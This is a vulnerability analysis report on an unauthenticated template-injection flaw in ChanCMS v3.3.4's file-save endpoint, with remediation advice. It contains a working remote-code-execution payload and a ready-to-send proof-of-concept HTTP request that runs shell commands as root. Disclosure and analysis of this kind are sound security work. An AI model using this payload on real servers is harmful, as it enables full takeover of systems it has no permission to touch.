# CVE-2025-65602 Vulnerability Analysis Report

## Overview

| Item | Description |
|------|-------------|
| CVE ID | CVE-2025-65602 |
| Affected Software | ChanCMS |
| Affected Version | v3.3.4 |
| Vulnerability Type | Template Injection / RCE (CWE-94) |
| CVSS Score | 9.8 (Critical) |

## Vulnerability Description

A template injection vulnerability exists in the `/vip/v1/file/save` component of ChanCMS v3.3.4. This endpoint allows unauthenticated attackers to save arbitrary content to template files. By injecting malicious art-template code, attackers can achieve Remote Code Execution (RCE) via `process.binding('spawn_sync')`.

## Technical Analysis

### Vulnerable Endpoint

```
POST /vip/v1/file/save
```

### Attack Chain

1. Attacker sends POST request to save malicious template content
2. Template file is written to the view directory
3. When any page using this template is accessed, the injected code executes
4. RCE is achieved via `process.binding('spawn_sync')`

### RCE Payload

```javascript
<%
var fn = ''.constructor.constructor;
var p = fn('return this.process')();
var spawn_sync = p.binding('spawn_sync');
var opts = {
  file: '/bin/sh',
  args: ['/bin/sh', '-c', 'id'],
  stdio: [
    { type: 'pipe', readable: true, writable: false },
    { type: 'pipe', readable: false, writable: true },
    { type: 'pipe', readable: false, writable: true }
  ]
};
var child = spawn_sync.spawn(opts);
var result = child.output[1].toString();
%>
{{result}}
```

### Exploitation Steps

1. Use constructor chain to access global `process` object
2. Call `process.binding('spawn_sync')` to get spawn_sync module
3. Execute arbitrary shell commands via `spawn_sync.spawn()`

## Proof of Concept

### Request

```http
POST /vip/v1/file/save HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
  "path": "/app/app/modules/web/view/default/common/debug.html",
  "content": "<% var fn=''.constructor.constructor; var p=fn('return this.process')(); var spawn=p.binding('spawn_sync'); var r=spawn.spawn({file:'/bin/sh',args:['/bin/sh','-c','id'],stdio:[{type:'pipe',readable:true,writable:false},{type:'pipe',readable:false,writable:true},{type:'pipe',readable:false,writable:true}]}); %>{{r.output[1].toString()}}"
}
```

### Result

```
uid=0(root) gid=0(root) groups=0(root)
```

## Impact

- **Remote Code Execution**: Full control over the server
- **No Authentication Required**: Endpoint is publicly accessible
- **Root Privileges**: Commands execute as the Node.js process user

## Remediation

1. Add authentication to `/vip/v1/file/save` endpoint
2. Restrict file write operations to authorized administrators
3. Validate and sanitize template content before saving
4. Consider using template sandboxing with restricted globals

## References

- [ChanCMS Gitee Repository](https://gitee.com/chancms/ChanCMS)
- [art-template Documentation](https://aui.github.io/art-template/)
